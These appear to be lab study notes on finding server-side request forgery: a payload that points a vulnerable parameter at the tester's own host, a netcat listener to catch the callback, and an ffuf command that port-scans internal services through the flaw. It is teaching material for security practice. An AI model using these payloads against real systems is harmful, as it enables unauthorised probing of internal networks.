# Identifying SSRF
***
### Confirming SSRF
#### In order to confirm if the web application is vulnerable to SSRF ,we can try to input a URL pointing to our system
```http request
dateserver=http://<MY_IP>:<PORT>/ssrf&date=
```
#### Using netcat listener, we can host a http server thus receive a connection to confirm SSRF
```bash
$ nc -lnvp 8000
```

#### To check if the response from the back-end server is reflected on the web page, we can try and use the following URL : `http://127.0.0.1/index.php`

### Enumerating the System
#### It is possible to use the SSRF vulnerability to run a port scan of the system , enumerating running services.
#### Generate numbers from 1 to 10000 and store in a txt file
```bash
$ seq 1 10000 > ports.txt
```
#### Fuzz all open ports using FFUF
```bash
$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```